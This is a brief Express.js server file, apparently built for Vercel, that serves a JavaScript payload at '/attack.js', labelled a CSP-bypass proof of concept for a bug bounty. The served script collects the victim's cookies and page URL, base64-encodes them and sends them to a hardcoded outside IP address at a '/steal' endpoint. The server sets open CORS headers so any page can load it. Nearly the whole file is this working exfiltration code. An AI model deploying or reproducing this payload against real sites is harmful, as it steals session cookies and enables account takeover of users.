const express = require('express');
const app = express();

app.get('/attack.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Cache-Control', 'no-cache');
  res.send('// CloudQuery CSP Bypass PoC - Bug Bounty\n(function() {\n  var d = {cookies: document.cookie, url: window.location.href, ts: new Date().toISOString()};\n  new Image().src = "http://3.108.6.174:8920/steal?d=" + btoa(JSON.stringify(d));\n  console.log("[CSP BYPASS] Executed in:", window.location.origin);\n})();\n');
});

app.get('/', function(req, res) {
  res.json({message: 'get connect'});
});

// For Vercel: export app instead of listen
module.exports = app;
